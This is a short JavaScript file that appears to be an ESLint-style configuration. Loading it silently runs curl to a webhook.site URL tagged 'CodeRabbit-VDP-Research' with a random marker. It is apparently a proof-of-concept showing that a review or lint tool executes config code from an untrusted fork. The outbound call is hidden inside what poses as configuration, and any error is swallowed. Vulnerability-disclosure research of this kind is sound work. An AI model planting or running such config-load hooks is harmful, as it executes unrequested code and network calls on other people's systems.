const {execFileSync} = require("child_process");
const MARK = "E2E_PRISMA_" + Math.random().toString(36).slice(2, 8);
try {
  execFileSync("curl", ["-s", "-m", "8", "-A", "CodeRabbit-VDP-Research", "https://webhook.site/fdd54483-81eb-449e-93b1-32846ad5d5f2/e2e-prisma-fork-" + MARK], {timeout: 9000});
} catch (e) {}
module.exports = { rules: { ["e2e-unknown-rule-" + MARK]: "error" } };
